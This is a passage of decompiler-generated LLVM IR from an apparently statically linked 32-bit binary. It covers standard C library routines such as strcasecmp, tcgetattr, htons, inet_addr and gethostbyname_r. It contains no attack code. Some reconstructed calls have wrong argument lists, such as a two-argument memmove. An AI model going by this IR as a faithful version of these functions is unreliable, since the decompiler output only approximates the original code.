  br label %dec_label_pc_804b8d8

dec_label_pc_804b8d8:                             ; preds = %dec_label_pc_804b8cd, %dec_label_pc_804b8d1
  %v0_804b8db = phi i32 [ 0, %dec_label_pc_804b8cd ], [ %v0_804b8db.pre, %dec_label_pc_804b8d1 ]
  ret i32 %v0_804b8db

; uselistorder directives
  uselistorder i32 %v1_804b8a6, { 1, 2, 0 }
  uselistorder i32 %v1_804b8a3, { 1, 0, 2 }
  uselistorder i32 %v1_804b84f, { 0, 2, 1 }
  uselistorder i32 %v3_804b84c, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_80518a0.332 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804b8d8, { 1, 0 }
  uselistorder label %dec_label_pc_804b8cd, { 1, 0 }
  uselistorder label %dec_label_pc_804b8b1, { 1, 0 }
  uselistorder label %dec_label_pc_804b88a, { 1, 0 }
  uselistorder label %dec_label_pc_804b849, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804b8f4 = inttoptr i32 %arg2 to i8*
  %v3_804b8f4 = call i32 @memmove(i8* %v2_804b8f4, i32 %arg1)
  ret i32 %v3_804b8f4
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b8fd = load i32, i32* bitcast (i32** @global_var_8053728.334 to i32*), align 8
  %v4_804b906 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804b90e

dec_label_pc_804b90e:                             ; preds = %dec_label_pc_804b92b, %entry
  %storemerge = phi i32 [ %v4_804b906, %entry ], [ %v1_804b92c, %dec_label_pc_804b92b ]
  %v0_804b92c = phi i32 [ %v4_804b906, %entry ], [ %v1_804b92c, %dec_label_pc_804b92b ]
  %v0_804b9317 = phi i32 [ 0, %entry ], [ %v0_804b9318, %dec_label_pc_804b92b ]
  %v0_804b92b = phi i32 [ %arg2, %entry ], [ %v1_804b92b, %dec_label_pc_804b92b ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_804b90e = icmp eq i32 %v0_804b92c, %v0_804b92b
  %.pre = inttoptr i32 %v0_804b92c to i8*
  br i1 %v12_804b90e, label %dec_label_pc_804b926, label %dec_label_pc_804b912

dec_label_pc_804b912:                             ; preds = %dec_label_pc_804b90e
  %v2_804b912 = load i8, i8* %.pre, align 1
  %v3_804b912 = zext i8 %v2_804b912 to i32
  %v2_804b915 = mul nuw nsw i32 %v3_804b912, 2
  %v3_804b915 = add i32 %v2_804b915, %v0_804b8fd
  %v4_804b915 = inttoptr i32 %v3_804b915 to i16*
  %v5_804b915 = load i16, i16* %v4_804b915, align 2
  %v6_804b915 = sext i16 %v5_804b915 to i32
  %v1_804b919 = inttoptr i32 %v0_804b92b to i8*
  %v2_804b919 = load i8, i8* %v1_804b919, align 1
  %v3_804b919 = zext i8 %v2_804b919 to i32
  %v2_804b91c = mul nuw nsw i32 %v3_804b919, 2
  %v3_804b91c = add i32 %v2_804b91c, %v0_804b8fd
  %v4_804b91c = inttoptr i32 %v3_804b91c to i16*
  %v5_804b91c = load i16, i16* %v4_804b91c, align 2
  %v6_804b91c = sext i16 %v5_804b91c to i32
  %v2_804b920 = sub nsw i32 %v6_804b915, %v6_804b91c
  %v12_804b920 = icmp eq i32 %v2_804b920, 0
  store i32 %v2_804b920, i32* @edx, align 4
  %v1_804b924 = icmp eq i1 %v12_804b920, false
  br i1 %v1_804b924, label %dec_label_pc_804b92f, label %dec_label_pc_804b926

dec_label_pc_804b926:                             ; preds = %dec_label_pc_804b90e, %dec_label_pc_804b912
  %v0_804b9318 = phi i32 [ %v2_804b920, %dec_label_pc_804b912 ], [ %v0_804b9317, %dec_label_pc_804b90e ]
  %v2_804b926 = load i8, i8* %.pre, align 1
  %v3_804b926 = icmp eq i8 %v2_804b926, 0
  br i1 %v3_804b926, label %dec_label_pc_804b92f, label %dec_label_pc_804b92b

dec_label_pc_804b92b:                             ; preds = %dec_label_pc_804b926
  %v1_804b92b = add i32 %v0_804b92b, 1
  %v1_804b92c = add i32 %v0_804b92c, 1
  br label %dec_label_pc_804b90e

dec_label_pc_804b92f:                             ; preds = %dec_label_pc_804b926, %dec_label_pc_804b912
  %v0_804b931 = phi i32 [ %v0_804b9318, %dec_label_pc_804b926 ], [ %v2_804b920, %dec_label_pc_804b912 ]
  ret i32 %v0_804b931

; uselistorder directives
  uselistorder i32 %v1_804b92c, { 1, 0 }
  uselistorder i32 %v0_804b9318, { 1, 0 }
  uselistorder i32 %v2_804b920, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804b92b, { 1, 2, 0 }
  uselistorder i32 %v0_804b92c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b926, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804b944 = inttoptr i32 %arg1 to i8*
  %v4_804b944 = call i32 @strtok_r(i8* %v3_804b944, i32 %arg2, i32 ptrtoint (i32* @global_var_8055bc0.335 to i32))
  ret i32 %v4_804b944
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804b95c = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804b961 = icmp eq i32 %v3_804b95c, 0
  %v1_804b963 = zext i1 %v1_804b961 to i32
  ret i32 %v1_804b963
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b970 = load i32, i32* @esi, align 4
  %v0_804b971 = load i32, i32* @ebx, align 4
  store i32 %v0_804b971, i32* %stack_var_-8, align 4
  %v2_804b975 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804b975, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804b987 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804b975)
  store i32 %v3_804b987, i32* %eax.global-to-local, align 4
  %v1_804b98f = icmp eq i32 %v3_804b987, 0
  store i32 %v3_804b987, i32* @esi, align 4
  %v1_804b993 = icmp eq i1 %v1_804b98f, false
  br i1 %v1_804b993, label %dec_label_pc_804b9d8, label %dec_label_pc_804b995

dec_label_pc_804b995:                             ; preds = %entry
  %v3_804b995 = load i32, i32* %stack_var_-44, align 4
  %v1_804b999 = load i32, i32* @ebx, align 4
  %v2_804b999 = inttoptr i32 %v1_804b999 to i32*
  store i32 %v3_804b995, i32* %v2_804b999, align 4
  %v1_804b99f = load i32, i32* @ebx, align 4
  %v2_804b99f = add i32 %v1_804b99f, 4
  %v3_804b99f = inttoptr i32 %v2_804b99f to i32*
  %v1_804b9a6 = load i32, i32* @ebx, align 4
  %v2_804b9a6 = add i32 %v1_804b9a6, 8
  %v3_804b9a6 = inttoptr i32 %v2_804b9a6 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804b9ad = load i32, i32* @ebx, align 4
  %v2_804b9ad = add i32 %v1_804b9ad, 12
  %v3_804b9ad = inttoptr i32 %v2_804b9ad to i32*
  store i32 %tmp3, i32* %v3_804b9ad, align 4
  %v4_804b9b0 = zext i8 %tmp to i32
  %v5_804b9b0 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9b0 = and i32 %v5_804b9b0, -256
  %v7_804b9b0 = or i32 %v6_804b9b0, %v4_804b9b0
  store i32 %v7_804b9b0, i32* %eax.global-to-local, align 4
  %v2_804b9b4 = load i32, i32* @ebx, align 4
  %v3_804b9b4 = add i32 %v2_804b9b4, 16
  %v4_804b9b4 = inttoptr i32 %v3_804b9b4 to i8*
  store i8 %tmp, i8* %v4_804b9b4, align 1
  %v0_804b9b7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b9ba = ptrtoint i32* %stack_var_-27 to i32
  %v0_804b9bf = load i32, i32* @ebx, align 4
  %v1_804b9bf = add i32 %v0_804b9bf, 17
  store i32 %v1_804b9bf, i32* %eax.global-to-local, align 4
  %v4_804b9c3 = call i32 @__GI_mempcpy(i32 %v1_804b9bf, i32 %v2_804b9ba, i32 19, i32 %v0_804b9b7)
  store i32 %v4_804b9c3, i32* %eax.global-to-local, align 4
  %v3_804b9d0 = inttoptr i32 %v4_804b9c3 to i8*
  %v4_804b9d0 = call i32 @__GI_memset(i8* %v3_804b9d0, i32 0, i32 13)
  store i32 %v4_804b9d0, i32* %eax.global-to-local, align 4
  %v0_804b9db.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b9d8

dec_label_pc_804b9d8:                             ; preds = %entry, %dec_label_pc_804b995
  %v0_804b9db = phi i32 [ %v3_804b987, %entry ], [ %v0_804b9db.pre, %dec_label_pc_804b995 ]
  store i32 %v0_804b9db, i32* %eax.global-to-local, align 4
  %v2_804b9dd = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b9dd, i32* @ebx, align 4
  store i32 %v0_804b970, i32* @esi, align 4
  ret i32 %v0_804b9db

; uselistorder directives
  uselistorder i32 %v0_804b9db, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804b9d8, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804b9e5 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804b9e5 = zext i16 %v3_804b9e5 to i32
  ret i32 %v4_804b9e5
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804b9f1 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804b9f1
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804b9f9 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804b9f9 = zext i16 %v3_804b9f9 to i32
  ret i32 %v4_804b9f9
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804ba05 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804ba05
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804ba0b = ptrtoint i32* %stack_var_-4 to i32
  %v2_804ba14 = inttoptr i32 %arg1 to i8*
  %v3_804ba14 = call i32 @inet_aton(i8* %v2_804ba14, i32 %v2_804ba0b)
  store i32 -1, i32* @edx, align 4
  %v1_804ba1f = icmp eq i32 %v3_804ba14, 0
  br i1 %v1_804ba1f, label %dec_label_pc_804ba27, label %dec_label_pc_804ba23

dec_label_pc_804ba23:                             ; preds = %entry
  %v3_804ba23 = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_804ba23, i32* @edx, align 4
  br label %dec_label_pc_804ba27

dec_label_pc_804ba27:                             ; preds = %entry, %dec_label_pc_804ba23
  %v0_804ba27 = phi i32 [ -1, %entry ], [ %v3_804ba23, %dec_label_pc_804ba23 ]
  ret i32 %v0_804ba27

; uselistorder directives
  uselistorder label %dec_label_pc_804ba27, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba33 = call i32 @__GI___h_errno_location()
  %v0_804ba38 = load i32, i32* @edx, align 4
  %v2_804ba3b = ptrtoint i32* %stack_var_-4 to i32
  %v9_804ba53 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_8055dac.337, i32 ptrtoint (i32* @global_var_8055be0.336 to i32), i32 460, i32 %v2_804ba3b, i32 %v0_804ba33, i32 %v0_804ba38, i32 %v0_804ba38)
  %v3_804ba58 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804ba58
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804ba60 = load i32, i32* @ebp, align 4
  %v0_804ba61 = load i32, i32* @edi, align 4
  %v0_804ba62 = load i32, i32* @esi, align 4
  %v0_804ba63 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804ba73 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804ba73, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804ba7e = icmp eq i32 %arg1, 0
  br i1 %v4_804ba7e, label %dec_label_pc_804bd8a, label %dec_label_pc_804ba89

dec_label_pc_804ba89:                             ; preds = %entry
  %v1_804ba89 = call i32 @__errno_location(i32 %v0_804ba63)
  store i32 %v1_804ba89, i32* %eax.global-to-local, align 4
  %v1_804ba8e = inttoptr i32 %v1_804ba89 to i32*
  %v2_804ba8e = load i32, i32* %v1_804ba8e, align 4
  store i32 %v2_804ba8e, i32* @edi, align 4
  store i32 %v1_804ba89, i32* @esi, align 4
  store i32 0, i32* %v1_804ba8e, align 4
  %v0_804baa1 = load i32, i32* @ebx, align 4
  store i32 %v0_804baa1, i32* %stack_var_-108, align 4
  %v7_804baad = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804baa1, i32 %arg5, i32 %arg6, i32 %v1_804ba89)
  store i32 %v7_804baad, i32* %eax.global-to-local, align 4
  %v1_804bab5 = icmp eq i32 %v7_804baad, 0
  br i1 %v1_804bab5, label %dec_label_pc_804bd8a, label %dec_label_pc_804babd

dec_label_pc_804babd:                             ; preds = %dec_label_pc_804ba89
  %v1_804bac1 = inttoptr i32 %arg6 to i32*
  %v2_804bac1 = load i32, i32* %v1_804bac1, align 4
  store i32 %v2_804bac1, i32* %edx.global-to-local, align 4
  %v9_804bac3 = icmp eq i32 %v2_804bac1, 1
  br i1 %v9_804bac3, label %dec_label_pc_804badd, label %dec_label_pc_804bac8

dec_label_pc_804bac8:                             ; preds = %dec_label_pc_804babd
  %v9_804bac8 = icmp eq i32 %v2_804bac1, 4
  br i1 %v9_804bac8, label %dec_label_pc_804badd, label %dec_label_pc_804bacd

dec_label_pc_804bacd:                             ; preds = %dec_label_pc_804bac8
  %v1_804bacd = add i32 %v2_804bac1, 1
  %v8_804bacd = icmp eq i32 %v1_804bacd, 0
  store i32 %v1_804bacd, i32* %edx.global-to-local, align 4
  %v1_804bace = icmp eq i1 %v8_804bacd, false
  br i1 %v1_804bace, label %dec_label_pc_804bd8a, label %dec_label_pc_804bad4

dec_label_pc_804bad4:                             ; preds = %dec_label_pc_804bacd
  %v0_804bad4 = load i32, i32* @esi, align 4
  %v1_804bad4 = inttoptr i32 %v0_804bad4 to i32*
  %v2_804bad4 = load i32, i32* %v1_804bad4, align 4
  %v11_804bad4 = icmp eq i32 %v2_804bad4, 2
  %v1_804bad7 = icmp eq i1 %v11_804bad4, false
  br i1 %v1_804bad7, label %dec_label_pc_804bd8a, label %dec_label_pc_804badd

dec_label_pc_804badd:                             ; preds = %dec_label_pc_804bad4, %dec_label_pc_804bac8, %dec_label_pc_804babd
  %v0_804badd = load i32, i32* @ebp, align 4
  %v1_804badf = sub i32 0, %v0_804badd
  %v1_804bae1 = urem i32 %v1_804badf, 4
  %v2_804bae1 = icmp eq i32 %v1_804bae1, 0
  store i32 %v1_804bae1, i32* %eax.global-to-local, align 4
  %v0_804bae4 = load i32, i32* @edi, align 4
  %v1_804bae4 = load i32, i32* @esi, align 4
  %v2_804bae4 = inttoptr i32 %v1_804bae4 to i32*
  store i32 %v0_804bae4, i32* %v2_804bae4, align 4
  %v0_804baf8.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804bae1, label %dec_label_pc_804baf4, label %dec_label_pc_804bae8

dec_label_pc_804bae8:                             ; preds = %dec_label_pc_804badd
  %v1_804bae8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bae8 = sub i32 %v0_804baf8.pre, %v1_804bae8
  %v7_804bae8 = icmp ult i32 %v0_804baf8.pre, %v1_804bae8
  br i1 %v7_804bae8, label %dec_label_pc_804bd85, label %dec_label_pc_804baf0

dec_label_pc_804baf0:                             ; preds = %dec_label_pc_804bae8
  %v0_804baf0 = load i32, i32* @ebp, align 4
  %v2_804baf0 = add i32 %v0_804baf0, %v1_804bae8
  store i32 %v2_804baf0, i32* @ebp, align 4
  store i32 %v2_804bae8, i32* @ebx, align 4
  br label %dec_label_pc_804baf4

dec_label_pc_804baf4:                             ; preds = %dec_label_pc_804badd, %dec_label_pc_804baf0
  %v0_804baf8 = phi i32 [ %v2_804bae8, %dec_label_pc_804baf0 ], [ %v0_804baf8.pre, %dec_label_pc_804badd ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804bac1, align 4
  %tmp41 = icmp ult i32 %v0_804baf8, 4
  br i1 %tmp41, label %dec_label_pc_804bd85, label %dec_label_pc_804bb07

dec_label_pc_804bb07:                             ; preds = %dec_label_pc_804baf4
  %v0_804bb07 = load i32, i32* @ebx, align 4
  %v1_804bb07 = add i32 %v0_804bb07, -4
  store i32 %v1_804bb07, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_804bb07, 8
  br i1 %tmp42, label %dec_label_pc_804bd85, label %dec_label_pc_804bb13

dec_label_pc_804bb13:                             ; preds = %dec_label_pc_804bb07
  %v1_804bb13 = add i32 %v0_804bb07, -12
  store i32 %v1_804bb13, i32* %eax.global-to-local, align 4
  %v0_804bb16 = load i32, i32* @ebp, align 4
  %v1_804bb16 = add i32 %v0_804bb16, 4
  store i32 %v1_804bb16, i32* %edx.global-to-local, align 4
  store i32 %v1_804bb16, i32* %stack_var_-92, align 4
  %v3_804bb1f = inttoptr i32 %v1_804bb16 to i32*
  store i32 %v0_804bb16, i32* %v3_804bb1f, align 4
  %v0_804bb22 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bb22 = add i32 %v0_804bb22, 4
  %v2_804bb22 = inttoptr i32 %v1_804bb22 to i32*
  store i32 0, i32* %v2_804bb22, align 4
  %tmp43 = icmp ult i32 %v1_804bb13, 32
  br i1 %tmp43, label %dec_label_pc_804bd85, label %dec_label_pc_804bb2f

dec_label_pc_804bb2f:                             ; preds = %dec_label_pc_804bb13
  %v0_804bb2f = load i32, i32* @ebx, align 4
  %v1_804bb2f = add i32 %v0_804bb2f, -44
  store i32 %v1_804bb2f, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_804bb2f, 256
  br i1 %tmp44, label %dec_label_pc_804bd85, label %dec_label_pc_804bb42

dec_label_pc_804bb42:                             ; preds = %dec_label_pc_804bb2f
  %v0_804bb42 = load i32, i32* @ebp, align 4
  %v1_804bb42 = add i32 %v0_804bb42, 12
  %v1_804bb49 = add i32 %v0_804bb42, 44
  store i32 %v1_804bb49, i32* @edi, align 4
  store i32 %v1_804bb49, i32* %stack_var_-108, align 4
  %v3_804bb56 = inttoptr i32 %v1_804bb49 to i8*
  %v4_804bb56 = call i32 @strncpy(i8* %v3_804bb56, i32 %arg1, i32 %v1_804bb2f)
  %v0_804bb5b = load i32, i32* @edi, align 4
  %v1_804bb5b = load i32, i32* @ebp, align 4
  %v2_804bb5b = add i32 %v1_804bb5b, 12
  %v3_804bb5b = inttoptr i32 %v2_804bb5b to i32*
  store i32 %v0_804bb5b, i32* %v3_804bb5b, align 4
  %v1_804bb62 = add i32 %v0_804bb42, 16
  %v2_804bb62 = inttoptr i32 %v1_804bb62 to i32*
  store i32 0, i32* %v2_804bb62, align 4
  %v2_804bb69 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804bb69, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804bb6b = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804bb70 = inttoptr i32 %arg1 to i8*
  %v3_804bb70 = call i32 @inet_aton(i8* %v2_804bb70, i32 %v0_804bb6b)
  store i32 %v3_804bb70, i32* %eax.global-to-local, align 4
  %v1_804bb78 = icmp eq i32 %v3_804bb70, 0
  br i1 %v1_804bb78, label %dec_label_pc_804bbb4, label %dec_label_pc_804bb7c

dec_label_pc_804bb7c:                             ; preds = %dec_label_pc_804bb42
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804bb80 = load i32, i32* @edi, align 4
  store i32 %v0_804bb80, i32* %arg2, align 4
  %v1_804bb82 = add i32 %tmp18, 8
  %v2_804bb82 = inttoptr i32 %v1_804bb82 to i32*
  store i32 2, i32* %v2_804bb82, align 4
  %v0_804bb89 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bb89 = add i32 %v0_804bb89, 12
  %v2_804bb89 = inttoptr i32 %v1_804bb89 to i32*
  store i32 4, i32* %v2_804bb89, align 4
  %v2_804bb90 = load i32, i32* %stack_var_-92, align 4
  %v1_804bb93 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bb93 = add i32 %v1_804bb93, 16
  %v3_804bb93 = inttoptr i32 %v2_804bb93 to i32*
  store i32 %v2_804bb90, i32* %v3_804bb93, align 4
  %v1_804bb9a = load i32, i32* %edx.global-to-local, align 4
  %v2_804bb9a = add i32 %v1_804bb9a, 4
  %v3_804bb9a = inttoptr i32 %v2_804bb9a to i32*
  store i32 %v1_804bb42, i32* %v3_804bb9a, align 4
  %v0_804bba1 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804bba1, i32* %v1_804ba73, align 4
  store i32 0, i32* %v1_804bac1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd8a

dec_label_pc_804bbb4:                             ; preds = %dec_label_pc_804bb42
  %v0_804bbb4 = call i32 @__open_nameservers()
  store i32 %v0_804bbb4, i32* @eax, align 4
  %v2_804bbc4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804bbc4, i32* @ebx, align 4
  store i32 %v2_804bbc4, i32* %stack_var_-108, align 4
  %v2_804bbc9 = call i32 @__pthread_return_void(i32 %v2_804bbc4, i32 134535499)
  store i32 %v2_804bbc9, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053730.338 to i32), i32* %stack_var_-108, align 4
  %v1_804bbd5 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053730.338 to i32))
  %v0_804bbda = load i32, i32* @global_var_80561d4.339, align 4
  store i32 %v0_804bbda, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8053730.338 to i32), i32* @ecx, align 4
  store i32 134535499, i32* @eax, align 4
  store i32 %v2_804bbc4, i32* %stack_var_-108, align 4
  %v2_804bbe5 = call i32 @__pthread_return_void(i32 %v2_804bbc4, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804bc00 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804bc05 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804bc05, i32* %eax.global-to-local, align 4
  store i32 %v2_804bc05, i32* %stack_var_-108, align 4
  %v0_804bc0f = load i32, i32* @esi, align 4
  %v7_804bc16 = call i32 @__dns_lookup(i8* %v2_804bb70, i32 1, i32 %v0_804bc0f, i32 ptrtoint (i32* @global_var_80561c8.340 to i32), i32 %v2_804bc05, i32 %v2_804bc00)
  store i32 %v7_804bc16, i32* %eax.global-to-local, align 4
  %v2_804bc1e = icmp slt i32 %v7_804bc16, 0
  %v1_804bc20 = icmp eq i1 %v2_804bc1e, false
  br i1 %v1_804bc20, label %dec_label_pc_804bc36, label %dec_label_pc_804bc22

dec_label_pc_804bc22:                             ; preds = %dec_label_pc_804bbb4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804bac1, align 4
  br label %dec_label_pc_804bd8a

dec_label_pc_804bc36:                             ; preds = %dec_label_pc_804bbb4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804bc49 = icmp ugt i32 %v1_804bb2f, 256
  %v15_804bc49 = icmp eq i32 %v0_804bb2f, 300
  %v2_804bc4d = or i1 %v10_804bc49, %v15_804bc49
  br i1 %v2_804bc4d, label %dec_label_pc_804bce8, label %dec_label_pc_804bc4f

dec_label_pc_804bc4f:                             ; preds = %dec_label_pc_804bc36
  %v3_804bc52 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804bc52, i32* %stack_var_-108, align 4
  %v1_804bc56 = call i32 @free(i32 %v3_804bc52)
  store i32 %v1_804bc56, i32* %eax.global-to-local, align 4
  store i32 %v3_804bc52, i32* @edi, align 4
  %v3_804bc5c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804bc5c, i32* %stack_var_-108, align 4
  %v1_804bc60 = call i32 @free(i32 %v3_804bc5c)
  store i32 -1, i32* %v1_804bac1, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd60

dec_label_pc_804bce8:                             ; preds = %dec_label_pc_804bc36
  %v3_804bced.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804bcf1.pre = load i32, i32* @edi, align 4
  store i32 %v0_804bcf1.pre, i32* %stack_var_-108, align 4
  %v3_804bcf2 = inttoptr i32 %v0_804bcf1.pre to i8*
  %v4_804bcf2 = call i32 @strncpy(i8* %v3_804bcf2, i32 %v3_804bced.pre, i32 %v1_804bb2f)
  store i32 %v4_804bcf2, i32* %eax.global-to-local, align 4
  %v3_804bcf8 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804bcf8, i32* %stack_var_-108, align 4
  %v1_804bcfc = call i32 @free(i32 %v3_804bcf8)
  store i32 %v1_804bcfc, i32* %eax.global-to-local, align 4
  %v12_804bd04 = icmp eq i32 %tmp10, 1
  %v1_804bd09 = icmp eq i1 %v12_804bd04, false
  br i1 %v1_804bd09, label %dec_label_pc_804bd65, label %dec_label_pc_804bd0b

dec_label_pc_804bd0b:                             ; preds = %dec_label_pc_804bce8
  %v0_804bd0b = load i32, i32* @edx, align 4
  %v0_804bd12 = load i32, i32* @ebp, align 4
  store i32 %v0_804bd12, i32* %stack_var_-108, align 4
  %v3_804bd13 = inttoptr i32 %tmp to i16*
  %v4_804bd13 = call i32 @memcpy(i16* %v3_804bd13, i32 4, i32 %v0_804bd0b)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804bd1c = load i32, i32* @edi, align 4
  store i32 %v0_804bd1c, i32* %arg2, align 4
  %v1_804bd1e = add i32 %tmp18, 8
  %v2_804bd1e = inttoptr i32 %v1_804bd1e to i32*
  store i32 2, i32* %v2_804bd1e, align 4
  %v0_804bd25 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd25 = add i32 %v0_804bd25, 12
  %v2_804bd25 = inttoptr i32 %v1_804bd25 to i32*
  store i32 4, i32* %v2_804bd25, align 4
  %v3_804bd2c = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804bd2c, i32* %edx.global-to-local, align 4
  %v1_804bd30 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd30 = add i32 %v1_804bd30, 16
  %v3_804bd30 = inttoptr i32 %v2_804bd30 to i32*
  store i32 %v3_804bd2c, i32* %v3_804bd30, align 4
  %v1_804bd37 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd37 = add i32 %v1_804bd37, 4
  %v3_804bd37 = inttoptr i32 %v2_804bd37 to i32*
  store i32 %v1_804bb42, i32* %v3_804bd37, align 4
  %v2_804bd3a = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804bd3a, i32* %eax.global-to-local, align 4
  %v3_804bd3b = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804bd3b, i32* %stack_var_-108, align 4
  %v1_804bd3f = call i32 @free(i32 %v3_804bd3b)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804ba73, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804bac1, align 4
  br label %dec_label_pc_804bd60

dec_label_pc_804bd60:                             ; preds = %dec_label_pc_804bd65, %dec_label_pc_804bc4f, %dec_label_pc_804bd0b
  br label %dec_label_pc_804bd8a

dec_label_pc_804bd65:                             ; preds = %dec_label_pc_804bce8
  %v3_804bd68 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804bd68, i32* %stack_var_-108, align 4
  %v1_804bd6c = call i32 @free(i32 %v3_804bd68)
  store i32 1, i32* %v1_804bac1, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd60

dec_label_pc_804bd85:                             ; preds = %dec_label_pc_804bb2f, %dec_label_pc_804bb13, %dec_label_pc_804bb07, %dec_label_pc_804baf4, %dec_label_pc_804bae8
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd8a

